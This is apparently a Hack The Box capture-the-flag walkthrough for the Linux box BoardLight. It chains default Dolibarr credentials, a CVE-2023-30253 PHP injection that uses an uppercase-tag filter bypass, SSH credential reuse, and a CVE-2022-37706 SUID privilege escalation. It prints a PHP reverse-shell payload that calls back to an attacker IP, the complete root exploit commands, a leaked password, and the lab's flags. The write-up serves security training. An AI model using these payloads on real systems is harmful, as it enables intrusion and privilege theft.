# BoardLight — Hack The Box Walkthrough

> **Box Details**
> - **IP:** 10.129.231.37
> - **OS:** Linux (Ubuntu)
> - **Difficulty:** Medium
> - **Date Completed:** 2026-03-30
> - **Status:** ✅ Root Access Achieved

---

## Executive Summary

BoardLight was a multi-stage penetration test combining vhost enumeration, a CMS vulnerability, credential reuse, and a local privilege escalation exploit. The attack chain progressed from an exposed Dolibarr CRM instance to full root access through two CVEs.

| Stage | User | Vector | CVEs |
|-------|------|--------|------|
| Initial Access | www-data | Dolibarr 17.0.0 authenticated RCE | CVE-2023-30253 |
| User | larissa | SSH with reused DB credentials | — |
| Root | root | Enlightenment SUID LPE | CVE-2022-37706 |

**Flags:**
- `user.txt`: `614c48b5566b264002cfbfac7febe353`
- `root.txt`: `74155102b929fb5df2ac7814145d6177`

---

## Attack Chain

```
[Attacker] 
    |
    | 1. VHost enum (ffuf) → discover crm.board.htb
    |
    v
[Dolibarr 17.0.0 - crm.board.htb]
    | admin:admin (default creds)
    |
    | 2. CVE-2023-30253 → PHP code injection
    |    (<?PHP uppercase bypasses <?php filter)
    |    (Plain page method bypasses dynamic page restrictions)
    |
    v
[www-data shell]
    |
    | 3. Read conf.php → DB creds: dolibarrowner:serverfun2$2023!!
    |
    v
[larissa SSH] ---> user.txt ✅
    |
    | 4. CVE-2022-37706 → enlightenment_sys SUID overflow
    |
    v
[root] ---> root.txt ✅
```

---

## Initial Access — CVE-2023-30253

### Discovery

Nmap revealed only two open ports: SSH (22) and HTTP (80). The main website at `boardlight.htb` was a static cybersecurity consulting firm page with no immediate vulnerabilities.

VHost enumeration against `board.htb` using `ffuf` uncovered a hidden subdomain:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://board.htb \
     -H "Host: FUZZ.board.htb" \
     -fs 15949
```

**Result:** `crm.board.htb` returned HTTP 200 with a distinctly different response size (6360 bytes vs 15949 for the main site).

### CRM Application — Dolibarr 17.0.0

`crm.board.htb` hosted **Dolibarr 17.0.0**, an open-source ERP/CRM platform. Initial testing revealed:
- Default credentials `admin:admin` were active
- Setup wizard had not been completed (message at `/admin/index.php`)

### Vulnerability: PHP Code Injection

**CVE-2023-30253** is an authenticated RCE in Dolibarr ≤ 17.0.0. The CMS/Website module allows creating web pages, but Dolibarr filters `<?php` (lowercase) PHP tags.

**Bypass:** Using `<?PHP` (uppercase) evades the filter.

### Exploitation Steps

1. **Login** to Dolibarr at `http://crm.board.htb` with `admin:admin`
2. **Enable Website module** via Home → Setup → Modules/Applications
3. **Create a new site** and add a **plain page** (not dynamic page)
4. **Inject the payload** in page content:

```php
<?PHP $sock=fsockopen("10.10.14.23",4444); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

5. **Trigger** by visiting the published page URL — reverse shell connects to listener

**Key findings:**
- `<?PHP` (uppercase) bypasses the `<?php` (lowercase) filter
- **Plain page** method works; dynamic page method is blocked

**Working payload saved to:** `raw_data/shell.html`

---

## Post-Exploitation — Path to User

### Stabilize Shell & Enumerate

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Background: Ctrl+Z, then: stty raw -echo; fg
export TERM=xterm
```

### Database Credentials

From `/var/www/html/dolibarr/htdocs/conf/conf.php`:
```
dolibarrowner:serverfun2$2023!!
```

### Credential Reuse — SSH as larissa

The DB password was reused for the system account `larissa`:

```bash
ssh larissa@10.129.231.37
Password: serverfun2$2023!!
```

```bash
larissa@boardlight:~$ cat ~/user.txt
614c48b5566b264002cfbfac7febe353
```

---

## Privilege Escalation — CVE-2022-37706

### Finding the Vector

```bash
find / -name enlightenment_sys -perm -4000 2>/dev/null
# Output: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

The Enlightenment Window Manager's `enlightenment_sys` binary was SUID root.

### Exploit

From [MaherAzzouzi/CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit):

```bash
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

### Technical Explanation

The vulnerability is a stack-based buffer overflow in how `enlightenment_sys` processes path arguments for the `mount` command. By crafting a path containing `;/tmp/exploit`:
1. The SUID binary accepts path arguments and passes them to `mount`
2. The path `/dev/../tmp/;/tmp/exploit` is not properly sanitized
3. The `;` acts as a command separator, executing `/tmp/exploit` (`/bin/sh`) with root privileges

```bash
root@boardlight:~# cat /root/root.txt
74155102b929fb5df2ac7814145d6177
```

---

## Timeline

| Date | Action |
|------|--------|
| 2026-03-26 14:29 | Discovered `crm.board.htb` via ffuf vhost enum |
| 2026-03-26 14:30 | Logged into Dolibarr with `admin:admin` |
| 2026-03-29 | Exploited CVE-2023-30253 (plain page + `<?PHP` bypass) |
| 2026-03-29 | Reverse shell → www-data; found DB creds in conf.php |
| 2026-03-29 | SSH as `larissa`, captured `user.txt` |
| 2026-03-30 10:45 | Executed CVE-2022-37706, captured `root.txt` |

---

## Lessons Learned

### What Worked
- **VHost enumeration is essential** — the main site revealed nothing, but `crm.board.htb` was the actual entry point
- **Default credentials persist** — `admin:admin` on Dolibarr is still viable in 2026
- **PHP filter bypass via case** — `<?PHP` (uppercase) evades `<?php` (lowercase) filters in Dolibarr's CMS module
- **Plain page > Dynamic page** — Dolibarr's "plain page" website method bypassed additional security restrictions
- **Credential reuse** — DB password reused for SSH provided a stable secondary shell
- **SUID binary enumeration** — Always check for SUID binaries; CVE-2022-37706 is a reliable privesc vector on Enlightenment systems

### What Didn't Work / Was Explored
- Direct RCE through `/do.php` contact form — handler not exploitable
- Dynamic page method in Dolibarr CMS — blocked by application restrictions
- Lowercase `<?php` tag injection — filtered by Dolibarr's sanitizer

### Key Takeaways
1. **Subdomain enumeration on non-standard domains** can reveal hidden applications with known vulnerabilities
2. **CMS applications are high-value targets** — default creds and known CVEs are still effective
3. **Case-based filter bypasses** (`<?PHP` vs `<?php`) remain relevant in PHP applications
4. **Credential reuse across services** (DB → SSH) remains a common and effective lateral movement technique
5. **Enlightenment SUID binaries** continue to be a viable privilege escalation path when not patched

---

## References

- [CVE-2023-30253 — Dolibarr PHP Code Injection](https://nvd.nist.gov/vuln/detail/CVE-2023-30253)
- [CVE-2022-37706 — Enlightenment SUID LPE](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)
- [MaherAzzouzi/CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
- [Dolibarr Official](https://www.dolibarr.org/)
